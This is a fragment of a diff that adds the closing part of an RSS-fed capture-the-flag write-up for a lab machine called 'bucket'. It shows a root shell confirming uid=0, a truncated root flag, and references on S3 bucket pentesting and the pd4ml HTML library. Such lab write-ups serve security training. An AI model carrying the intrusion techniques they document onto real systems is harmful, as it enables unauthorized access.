+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48
+
+...&lt;SNIP&gt;...
+root@bucket:~# id;hostname;cut -c-15 root.txt 
+uid=0(root) gid=0(root) groups=0(root)
+bucket
+efc73dd09ceb705
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3">https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3</a></li>
+<li><a href="https://pd4ml.com/html.htm">https://pd4ml.com/html.htm</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
